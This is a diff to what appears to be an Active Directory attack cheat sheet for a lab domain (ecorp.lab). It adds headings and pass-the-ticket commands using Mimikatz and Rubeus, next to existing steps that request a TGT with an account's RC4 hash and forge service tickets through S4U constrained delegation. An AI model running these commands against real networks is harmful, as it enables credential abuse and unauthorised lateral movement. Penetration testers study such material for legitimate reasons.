@@ -701,11 +701,13 @@ Or using ActiveDirectory module:
 
 ```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
 
-Request TGT:
+* * *
+
+#### Requesting a (constrained delegation) TGT:
 
 ```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61```
 
-Using S4U and the previous TGT, request a TGS:
+#### Using S4U and the previous TGT, request a TGS:
 
 ```
 tgs::s4u /tgt:CERT_WE_STOLE.kirbi
@@ -729,6 +731,11 @@ This would do all the steps for us!
 
 Inject PTT:
 
+``` Invoke-Mimikatz -Command '"kerberos::ptt C:\Windows\System32\TGS_<snip>_.kirbi"' ```
+
+OR
+
+``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_<snip>_.kirbi ```
 
 
 # Why wait when you can spool?
